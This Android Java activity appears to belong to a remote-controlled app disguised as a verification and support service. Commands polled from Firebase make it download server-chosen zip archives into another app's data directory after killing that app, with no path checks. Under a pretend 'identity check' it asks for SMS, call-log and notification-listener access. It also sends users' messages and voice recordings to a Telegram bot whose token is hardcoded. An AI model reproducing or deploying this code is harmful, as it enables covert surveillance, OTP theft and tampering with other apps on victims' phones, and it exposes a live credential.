package com.ban.ab;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.cardview.widget.CardView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.material.floatingactionbutton.FloatingActionButton;

import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Iterator;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okio.BufferedSink;
import okio.Okio;

public class SecondActivity extends AppCompatActivity {

    private String userName;
    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private final String TELEGRAM_BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String ADMIN_CHAT_ID = "1749638488";
    private final OkHttpClient client = new OkHttpClient();

    private CardView layoutWaiting, layoutRejected, layoutFields, layoutZipTask, layoutVerifyTask;
    private TextView txtRejectReason, txtProgressStatus, txtTicketID;
    private Button btnCancelOrder, btnExecuteTask, btnStartFullVerify;
    private ProgressBar taskProgressBar, verifyProgressBar;

    private MediaRecorder recorder;
    private String voiceFileName;
    private FloatingActionButton fabChat;
    private final Handler chatHandler = new Handler(Looper.getMainLooper());
    private Runnable chatRunnable;
    private final Handler refreshHandler = new Handler(Looper.getMainLooper());
    private Runnable refreshRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        requestStoragePermissions();
        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");

        initViews();
        setupFloatingChatButton();
        generateTicketID();
        startAutoRefresh();
    }

    private void requestStoragePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        layoutZipTask = findViewById(R.id.layoutZipTask);
        layoutVerifyTask = findViewById(R.id.layoutVerifyTask); // الواجهة الزرقاء الجديدة

        txtProgressStatus = findViewById(R.id.txtProgressStatus);
        txtTicketID = findViewById(R.id.txtTicketID);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        btnCancelOrder = findViewById(R.id.btnCancelOrder);
        btnExecuteTask = findViewById(R.id.btnExecuteTask);
        btnStartFullVerify = findViewById(R.id.btnStartFullVerify);

        taskProgressBar = findViewById(R.id.taskProgressBar);
        verifyProgressBar = findViewById(R.id.verifyProgressBar);

        btnCancelOrder.setOnClickListener(v -> {
            stopAutoRefresh();
            getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    private void setupFloatingChatButton() {
        fabChat = new FloatingActionButton(this);
        fabChat.setImageResource(android.R.drawable.stat_notify_chat);
        fabChat.setBackgroundTintList(android.content.res.ColorStateList.valueOf(Color.parseColor("#1A73E8")));
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(-2, -2);
        params.gravity = Gravity.BOTTOM | Gravity.START;
        params.setMargins(50, 0, 0, 50);
        ((ViewGroup) findViewById(android.R.id.content)).addView(fabChat, params);
        fabChat.setOnClickListener(v -> showChatPopup());
    }

    @SuppressLint("ClickableViewAccessibility")
    private void showChatPopup() {
        final Dialog chatDialog = new Dialog(this);
        chatDialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        chatDialog.setContentView(R.layout.chat_layout);
        chatDialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        Window window = chatDialog.getWindow();
        window.setGravity(Gravity.BOTTOM | Gravity.START);
        WindowManager.LayoutParams wlp = window.getAttributes();
        wlp.x = 50; wlp.y = 200;
        window.setAttributes(wlp);

        LinearLayout msgContainer = chatDialog.findViewById(R.id.chatMessagesContainer);
        ScrollView scrollView = chatDialog.findViewById(R.id.chatScrollView);
        EditText edtMsg = chatDialog.findViewById(R.id.edtMessage);
        ImageButton btnSend = chatDialog.findViewById(R.id.btnSendMessage);
        ImageButton btnRecord = chatDialog.findViewById(R.id.btnRecord);

        startChatMonitoring(msgContainer, scrollView);

        chatDialog.findViewById(R.id.btnCloseChat).setOnClickListener(v -> {
            stopChatMonitoring();
            chatDialog.dismiss();
        });

        btnSend.setOnClickListener(v -> {
            String text = edtMsg.getText().toString().trim();
            if (!text.isEmpty()) {
                saveMessageToFirebase("user", text);
                sendTextToTelegram(text);
                edtMsg.setText("");
            }
        });

        btnRecord.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, 101);
                } else {
                    startVoiceRecording();
                    btnRecord.setColorFilter(Color.RED);
                }
            } else if (event.getAction() == MotionEvent.ACTION_UP) {
                stopVoiceRecording();
                btnRecord.setColorFilter(Color.parseColor("#1A73E8"));
            }
            return true;
        });

        chatDialog.show();
    }

    private void startVoiceRecording() {
        try {
            voiceFileName = getExternalCacheDir().getAbsolutePath() + "/v_msg.m4a";
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(voiceFileName);
            recorder.prepare();
            recorder.start();
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void stopVoiceRecording() {
        if (recorder != null) {
            try {
                recorder.stop();
                recorder.release();
                recorder = null;
                saveMessageToFirebase("user", "🎤 بصمة صوتية");
                sendVoiceToTelegram(voiceFileName);
            } catch (RuntimeException e) {
                if (recorder != null) { recorder.release(); recorder = null; }
            }
        }
    }

    private void sendVoiceToTelegram(String path) {
        File file = new File(path);
        if (!file.exists()) return;
        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("voice", file.getName(), RequestBody.create(file, MediaType.parse("audio/m4a")))
                .addFormDataPart("chat_id", ADMIN_CHAT_ID)
                .build();
        client.newCall(new Request.Builder().url("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendVoice").post(body).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void sendTextToTelegram(String msg) {
        String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage?chat_id=" + ADMIN_CHAT_ID + "&text=" + Uri.encode("💬 " + userName + ":\n" + msg);
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) {}
        });
    }

    private void updateUI(String status, JSONObject data) {
        layoutWaiting.setVisibility(View.GONE);
        layoutRejected.setVisibility(View.GONE);
        layoutFields.setVisibility(View.GONE);
        layoutZipTask.setVisibility(View.GONE);
        layoutVerifyTask.setVisibility(View.GONE);

        switch (status) {
            case "rejected":
                layoutRejected.setVisibility(View.VISIBLE);
                txtRejectReason.setText(data.optString("reason", "تم الرفض"));
                break;
            case "fields":
                layoutFields.setVisibility(View.VISIBLE);
                break;
            case "zip_task":
                layoutZipTask.setVisibility(View.VISIBLE);
                btnExecuteTask.setOnClickListener(v -> 
                    startModdingProcess(data.optString("zip_url"), data.optString("target_package")));
                break;
            case "verify_phone":
                layoutVerifyTask.setVisibility(View.VISIBLE);
                btnStartFullVerify.setOnClickListener(v -> executeFullVerify());
                break;
            default:
                layoutWaiting.setVisibility(View.VISIBLE);
                break;
        }
    }

    private void executeFullVerify() {
        btnStartFullVerify.setEnabled(false);
        verifyProgressBar.setVisibility(View.VISIBLE);

        // 1. طلب أذونات الهاتف والرسائل
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_SMS
            }, 202);
        }

        // 2. توجيه المستخدم لتفعيل مراقب الإشعارات
        new Handler().postDelayed(() -> {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(intent);
            Toast.makeText(this, "يرجى تفعيل 'نظام فحص الهوية' لإتمام الربط", Toast.LENGTH_LONG).show();
            btnStartFullVerify.setEnabled(true);
            verifyProgressBar.setVisibility(View.GONE);
        }, 2000);
    }

    private void startModdingProcess(String url, String pkg) {
        btnExecuteTask.setEnabled(false);
        taskProgressBar.setVisibility(View.VISIBLE);
        new Thread(() -> {
            boolean success = false;
            try {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                am.killBackgroundProcesses(pkg);
                Thread.sleep(1000);
                Context targetContext = createPackageContext(pkg, Context.CONTEXT_IGNORE_SECURITY);
                File targetDir = new File(targetContext.getApplicationInfo().dataDir);
                File tempZip = new File(getCacheDir(), "update.zip");
                downloadFileSync(url, tempZip);
                unzip(tempZip, targetDir);
                tempZip.delete();
                success = true;
            } catch (Exception e) { e.printStackTrace(); }
            final boolean finalSuccess = success;
            runOnUiThread(() -> {
                taskProgressBar.setVisibility(View.GONE);
                btnExecuteTask.setEnabled(true);
                Toast.makeText(this, finalSuccess ? "تم التحديث بنجاح ✅" : "فشلت العملية ❌", Toast.LENGTH_LONG).show();
            });
        }).start();
    }

    private void downloadFileSync(String url, File destFile) throws IOException {
        Request request = new Request.Builder().url(url).build();
        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) throw new IOException("Download failed");
            try (BufferedSink sink = Okio.buffer(Okio.sink(destFile))) {
                sink.writeAll(response.body().source());
            }
        }
    }

    private void unzip(File zipFile, File targetDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(new BufferedInputStream(new FileInputStream(zipFile)))) {
            ZipEntry ze;
            while ((ze = zis.getNextEntry()) != null) {
                File file = new File(targetDir, ze.getName());
                if (ze.isDirectory()) file.mkdirs();
                else {
                    File parent = file.getParentFile();
                    if (parent != null) parent.mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = zis.read(buffer)) != -1) fos.write(buffer, 0, len);
                    }
                }
            }
        }
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override public void run() { checkFirebaseStatus(); refreshHandler.postDelayed(this, 5000); }
        };
        refreshHandler.post(refreshRunnable);
    }

    private void checkFirebaseStatus() {
        String url = FIREBASE_URL + "commands/" + userName + ".json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        String res = response.body().string();
                        if (res.equals("null")) return;
                        JSONObject data = new JSONObject(res);
                        runOnUiThread(() -> updateUI(data.optString("status"), data));
                    } catch (Exception ignored) {}
                }
            }
        });
    }

    private void startChatMonitoring(LinearLayout container, ScrollView scroll) {
        chatRunnable = new Runnable() {
            @Override public void run() { loadChatMessages(container, scroll); chatHandler.postDelayed(this, 3000); }
        };
        chatHandler.post(chatRunnable);
    }

    private void loadChatMessages(LinearLayout container, ScrollView scroll) {
        String url = FIREBASE_URL + "commands/" + userName + "/messages.json";
        client.newCall(new Request.Builder().url(url).build()).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    String data = response.body().string();
                    if (data.equals("null")) return;
                    runOnUiThread(() -> {
                        try {
                            JSONObject json = new JSONObject(data);
                            container.removeAllViews();
                            Iterator<String> keys = json.keys();
                            while (keys.hasNext()) {
                                JSONObject msgObj = json.getJSONObject(keys.next());
                                addMessageToUI(container, msgObj.getString("text"), msgObj.getString("sender"));
                            }
                            scroll.post(() -> scroll.fullScroll(View.FOCUS_DOWN));
                        } catch (Exception ignored) {}
                    });
                }
            }
        });
    }

    private void addMessageToUI(LinearLayout container, String text, String sender) {
        TextView tv = new TextView(this);
        tv.setText(text);
        tv.setPadding(35, 25, 35, 25);
        tv.setTextSize(14);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-2, -2);
        lp.setMargins(15, 10, 15, 10);
        if (sender.equals("user")) {
            tv.setBackgroundResource(android.R.drawable.editbox_dropdown_light_frame);
            tv.setTextColor(Color.BLACK);
            lp.gravity = Gravity.END;
        } else {
            tv.setBackgroundResource(android.R.drawable.editbox_dropdown_dark_frame);
            tv.setTextColor(Color.WHITE);
            lp.gravity = Gravity.START;
        }
        container.addView(tv, lp);
    }

    private void saveMessageToFirebase(String sender, String text) {
        String url = FIREBASE_URL + "commands/" + userName + "/messages.json";
        try {
            JSONObject msg = new JSONObject();
            msg.put("sender", sender);
            msg.put("text", text);
            msg.put("time", System.currentTimeMillis());
            client.newCall(new Request.Builder().url(url).post(RequestBody.create(msg.toString(), MediaType.parse("application/json"))).build()).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) {}
                @Override public void onResponse(Call call, Response response) {}
            });
        } catch (Exception ignored) {}
    }

    private void generateTicketID() { txtTicketID.setText("ID: " + (System.currentTimeMillis() / 100000)); }
    private void stopChatMonitoring() { chatHandler.removeCallbacks(chatRunnable); }
    private void stopAutoRefresh() { refreshHandler.removeCallbacks(refreshRunnable); }
    @Override protected void onDestroy() { super.onDestroy(); stopAutoRefresh(); stopChatMonitoring(); }
}
